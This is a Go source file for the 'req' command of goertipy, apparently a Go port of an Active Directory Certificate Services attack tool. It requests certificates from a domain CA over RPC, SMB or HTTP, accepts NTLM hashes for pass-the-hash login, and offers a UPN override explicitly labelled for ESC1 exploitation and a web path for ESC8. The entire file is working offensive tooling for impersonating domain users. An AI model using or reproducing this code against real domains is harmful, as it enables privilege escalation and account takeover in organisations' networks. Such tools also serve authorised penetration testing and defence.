package commands

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/slacker/goertipy/pkg/adcs"
	goertipycert "github.com/slacker/goertipy/pkg/cert"
	goertipyldap "github.com/slacker/goertipy/pkg/ldap"
	goertipylog "github.com/slacker/goertipy/pkg/log"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

// ReqFlags holds all flags for the req command.
type ReqFlags struct {
	// Target
	CA       string
	Template string
	DCIP     string

	// Transport
	WebURL  string // HTTP/HTTPS enrollment URL
	UsePipe bool   // Use named pipe (SMB) transport

	// Auth
	Username string
	Password string
	Hashes   string
	Domain   string

	// Subject overrides
	Subject string
	UPN     string
	DNS     string

	// Retrieval
	RequestID uint32

	// Key options
	KeySize int

	// Output
	Output  string
	PFXPass string

	// Verbosity
	Debug   bool
	Verbose bool
}

var reqFlags ReqFlags

// NewReqCommand creates the req subcommand.
func NewReqCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "req",
		Short: "Request a certificate from a Certificate Authority",
		Long: `Request a certificate from an AD CS Certificate Authority.

Supports RPC (MS-ICPR) and HTTP/HTTPS (certsrv) enrollment.
Use --web to specify an HTTP/HTTPS URL for web enrollment (ESC8).
Supports ESC1 exploitation by specifying an alternate UPN in the SAN field.
Can also retrieve pending certificates by request ID.`,
		RunE: runReq,
	}

	// Target flags
	cmd.Flags().StringVar(&reqFlags.CA, "ca", "", "CA name (e.g., 'host\\ca-name')")
	cmd.Flags().StringVar(&reqFlags.Template, "template", "", "Certificate template name")
	cmd.Flags().StringVar(&reqFlags.DCIP, "dc-ip", "", "Domain Controller / CA server IP")
	cmd.Flags().StringVar(&reqFlags.WebURL, "web", "", "HTTP/HTTPS enrollment URL (e.g., http://ca.corp.local)")
	cmd.Flags().BoolVar(&reqFlags.UsePipe, "pipe", false, "Use SMB named pipe transport (port 445)")

	// Auth flags
	cmd.Flags().StringVarP(&reqFlags.Username, "username", "u", "", "Username")
	cmd.Flags().StringVarP(&reqFlags.Password, "password", "p", "", "Password")
	cmd.Flags().StringVarP(&reqFlags.Hashes, "hashes", "H", "", "NTLM hash (LM:NT or :NT)")
	cmd.Flags().StringVarP(&reqFlags.Domain, "domain", "d", "", "Target domain")

	// Subject overrides
	cmd.Flags().StringVar(&reqFlags.Subject, "subject", "", "Certificate subject CN")
	cmd.Flags().StringVar(&reqFlags.UPN, "upn", "", "UPN SAN override (ESC1 exploitation)")
	cmd.Flags().StringVar(&reqFlags.DNS, "dns", "", "DNS SAN override")

	// Retrieval
	cmd.Flags().Uint32Var(&reqFlags.RequestID, "request-id", 0, "Retrieve pending cert by request ID")

	// Key options
	cmd.Flags().IntVar(&reqFlags.KeySize, "key-size", 2048, "RSA key size")

	// Output
	cmd.Flags().StringVarP(&reqFlags.Output, "output", "o", "", "Output filename prefix (default: CA_Template)")
	cmd.Flags().StringVar(&reqFlags.PFXPass, "pfx-pass", "", "PFX password (default: empty)")

	// Verbosity
	cmd.Flags().BoolVarP(&reqFlags.Verbose, "verbose", "v", false, "Verbose output")
	cmd.Flags().BoolVar(&reqFlags.Debug, "debug", false, "Debug output")

	return cmd
}

func runReq(cmd *cobra.Command, args []string) error {
	// Set up logger
	level := goertipylog.LevelWarn
	if reqFlags.Debug {
		level = goertipylog.LevelDebug
	} else if reqFlags.Verbose {
		level = goertipylog.LevelInfo
	}
	log := goertipylog.New(level, os.Stderr)

	// Validate
	if reqFlags.Username == "" {
		return fmt.Errorf("username is required (-u/--username)")
	}
	if reqFlags.DCIP == "" && reqFlags.WebURL == "" {
		return fmt.Errorf("DC/CA IP (--dc-ip) or web URL (--web) is required")
	}
	if reqFlags.CA == "" {
		return fmt.Errorf("CA name is required (--ca)")
	}

	// Extract domain from username if not provided
	if reqFlags.Domain == "" {
		if strings.Contains(reqFlags.Username, "@") {
			parts := strings.SplitN(reqFlags.Username, "@", 2)
			reqFlags.Domain = parts[1]
			reqFlags.Username = parts[0]
		} else if strings.Contains(reqFlags.Username, "\\") {
			parts := strings.SplitN(reqFlags.Username, "\\", 2)
			reqFlags.Domain = parts[0]
			reqFlags.Username = parts[1]
		} else {
			return fmt.Errorf("domain is required (-d/--domain) or use user@domain format")
		}
	}

	// Password prompt
	if reqFlags.Password == "" && reqFlags.Hashes == "" {
		fmt.Print("Password: ")
		passwordBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
		fmt.Println()
		if err != nil {
			return fmt.Errorf("failed to read password: %w", err)
		}
		reqFlags.Password = string(passwordBytes)
	}

	// Parse hashes
	var ntHash string
	if reqFlags.Hashes != "" {
		_, nt, err := goertipyldap.ParseHashes(reqFlags.Hashes)
		if err != nil {
			return fmt.Errorf("invalid hashes: %w", err)
		}
		ntHash = nt
		log.Info("Using NTLM hash authentication")
	}

	// Handle retrieval vs new request
	if reqFlags.RequestID > 0 {
		return retrieveCert(log, ntHash)
	}

	// Template is required for new requests
	if reqFlags.Template == "" {
		return fmt.Errorf("template is required (--template)")
	}

	return requestCert(log, ntHash)
}

func requestCert(log *goertipylog.Logger, ntHash string) error {
	fmt.Printf("[*] Requesting certificate from %s\n", reqFlags.CA)
	fmt.Printf("[*] Template: %s\n", reqFlags.Template)
	if reqFlags.UPN != "" {
		fmt.Printf("[*] UPN SAN: %s (ESC1)\n", reqFlags.UPN)
	}
	if reqFlags.DNS != "" {
		fmt.Printf("[*] DNS SAN: %s\n", reqFlags.DNS)
	}

	if reqFlags.WebURL != "" {
		log.Info("Connecting to %s via HTTP/HTTPS", reqFlags.WebURL)
		return requestCertHTTP(log, ntHash)
	}

	if reqFlags.UsePipe {
		log.Info("Connecting to %s via named pipe (SMB)", reqFlags.DCIP)
	} else {
		log.Info("Connecting to %s via RPC", reqFlags.DCIP)
	}

	result, err := adcs.Enroll(cmd_context(), &adcs.EnrollOptions{
		CA:           reqFlags.CA,
		Template:     reqFlags.Template,
		Subject:      reqFlags.Subject,
		UPN:          reqFlags.UPN,
		DNS:          reqFlags.DNS,
		Server:       reqFlags.DCIP,
		Username:     reqFlags.Username,
		Password:     reqFlags.Password,
		NTHash:       ntHash,
		Domain:       reqFlags.Domain,
		KeySize:      reqFlags.KeySize,
		OutputPrefix: reqFlags.Output,
		UsePipe:      reqFlags.UsePipe,
		Debug:        reqFlags.Debug,
	})
	if err != nil {
		return err
	}

	fmt.Printf("[*] Request ID: %d\n", result.RequestID)
	fmt.Printf("[*] Status: %s\n", result.Status)

	if result.Certificate != nil {
		// Determine output filename
		prefix := reqFlags.Output
		if prefix == "" {
			caShort := reqFlags.CA
			if idx := strings.LastIndex(caShort, "\\"); idx >= 0 {
				caShort = caShort[idx+1:]
			}
			prefix = fmt.Sprintf("%s_%s", caShort, reqFlags.Template)
		}

		pfxFile := prefix + ".pfx"
		err := goertipycert.SavePFX(result.Certificate, result.PrivateKey, result.CACerts, pfxFile, reqFlags.PFXPass)
		if err != nil {
			return fmt.Errorf("failed to save PFX: %w", err)
		}
		fmt.Printf("[+] Certificate saved to %s\n", pfxFile)
		fmt.Printf("[*] Subject: %s\n", result.Certificate.Subject)
		fmt.Printf("[*] Serial: %s\n", result.Certificate.SerialNumber)
		fmt.Printf("[*] Valid: %s - %s\n",
			result.Certificate.NotBefore.Format("2006-01-02"),
			result.Certificate.NotAfter.Format("2006-01-02"))
	}

	return nil
}

func retrieveCert(log *goertipylog.Logger, ntHash string) error {
	fmt.Printf("[*] Retrieving certificate (Request ID: %d) from %s\n", reqFlags.RequestID, reqFlags.CA)

	var result *adcs.EnrollResult
	var err error

	if reqFlags.WebURL != "" {
		result, err = adcs.RetrieveHTTP(cmd_context(), &adcs.RetrieveOptions{
			CA:        reqFlags.CA,
			RequestID: reqFlags.RequestID,
			WebURL:    reqFlags.WebURL,
			Username:  reqFlags.Username,
			Password:  reqFlags.Password,
			NTHash:    ntHash,
			Domain:    reqFlags.Domain,
			Debug:     reqFlags.Debug,
		})
	} else {
		result, err = adcs.Retrieve(cmd_context(), &adcs.RetrieveOptions{
			CA:        reqFlags.CA,
			RequestID: reqFlags.RequestID,
			Server:    reqFlags.DCIP,
			Username:  reqFlags.Username,
			Password:  reqFlags.Password,
			NTHash:    ntHash,
			Domain:    reqFlags.Domain,
			UsePipe:   reqFlags.UsePipe,
			Debug:     reqFlags.Debug,
		})
	}
	if err != nil {
		return err
	}

	fmt.Printf("[*] Status: %s\n", result.Status)

	if result.Certificate != nil {
		// Note: retrieved certs don't have the private key from the original request
		// The user needs the key from the original request to create a usable PFX
		fmt.Printf("[+] Certificate retrieved (Request ID: %d)\n", result.RequestID)
		fmt.Printf("[*] Subject: %s\n", result.Certificate.Subject)
		fmt.Printf("[!] Note: To create a PFX, you need the private key from the original request\n")
	}

	return nil
}

func requestCertHTTP(log *goertipylog.Logger, ntHash string) error {
	result, err := adcs.EnrollHTTP(cmd_context(), &adcs.EnrollOptions{
		CA:           reqFlags.CA,
		Template:     reqFlags.Template,
		Subject:      reqFlags.Subject,
		UPN:          reqFlags.UPN,
		DNS:          reqFlags.DNS,
		WebURL:       reqFlags.WebURL,
		Username:     reqFlags.Username,
		Password:     reqFlags.Password,
		NTHash:       ntHash,
		Domain:       reqFlags.Domain,
		KeySize:      reqFlags.KeySize,
		OutputPrefix: reqFlags.Output,
		Debug:        reqFlags.Debug,
	})
	if err != nil {
		return err
	}

	fmt.Printf("[*] Request ID: %d\n", result.RequestID)
	fmt.Printf("[*] Status: %s\n", result.Status)

	if result.Certificate != nil {
		prefix := reqFlags.Output
		if prefix == "" {
			caShort := reqFlags.CA
			if idx := strings.LastIndex(caShort, "\\"); idx >= 0 {
				caShort = caShort[idx+1:]
			}
			prefix = fmt.Sprintf("%s_%s", caShort, reqFlags.Template)
		}

		pfxFile := prefix + ".pfx"
		err := goertipycert.SavePFX(result.Certificate, result.PrivateKey, result.CACerts, pfxFile, reqFlags.PFXPass)
		if err != nil {
			return fmt.Errorf("failed to save PFX: %w", err)
		}
		fmt.Printf("[+] Certificate saved to %s\n", pfxFile)
		fmt.Printf("[*] Subject: %s\n", result.Certificate.Subject)
		fmt.Printf("[*] Serial: %s\n", result.Certificate.SerialNumber)
		fmt.Printf("[*] Valid: %s - %s\n",
			result.Certificate.NotBefore.Format("2006-01-02"),
			result.Certificate.NotAfter.Format("2006-01-02"))
	}

	return nil
}

// cmd_context returns a background context for RPC operations.
func cmd_context() context.Context {
	return context.Background()
}
